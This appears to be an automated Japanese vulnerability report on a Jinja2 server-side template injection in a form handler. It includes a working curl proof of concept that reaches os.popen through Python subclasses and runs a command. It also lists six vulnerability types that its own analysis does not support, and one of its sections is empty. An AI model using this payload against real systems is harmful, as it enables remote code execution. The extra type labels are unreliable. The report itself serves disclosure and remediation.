# Analysis Report

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `RCE`
- `AFO`
- `SSRF`
- `LFI`
- `SQLI`
- `XSS`
- `IDOR`

## PAR Policy Analysis

## 詳細解析

アプリケーションはリクエストパラメータ「name」をそのままJinja2のTemplateコンストラクタに渡し、sandboxなしでテンプレートをレンダリングしています。これにより、攻撃者はテンプレートインジェクションを通じて任意のPythonコードを実行でき、リモートコード実行（RCE）が可能です。

## PoC（概念実証コード）

```text
以下のように悪意あるテンプレートを送信すると、サーバー上で『id』コマンドが実行され、その結果がレスポンスに含まれます。

curl -X POST http://localhost:5000/submit \
  -F "name={{().__class__.__mro__[1].__subclasses__()[396]().__init__.__globals__['os'].popen('id').read()}}"

※subclasses()のインデックスは環境により異なるため調整が必要です。
```

## 解析ノート

- request.form['name'] で未検証のユーザ入力を取得
- f-文字列で謝辞メッセージを作成（エスケープ処理なし）
- Template() に直接渡し、sandbox無効
- template.render() により任意テンプレート実行可能

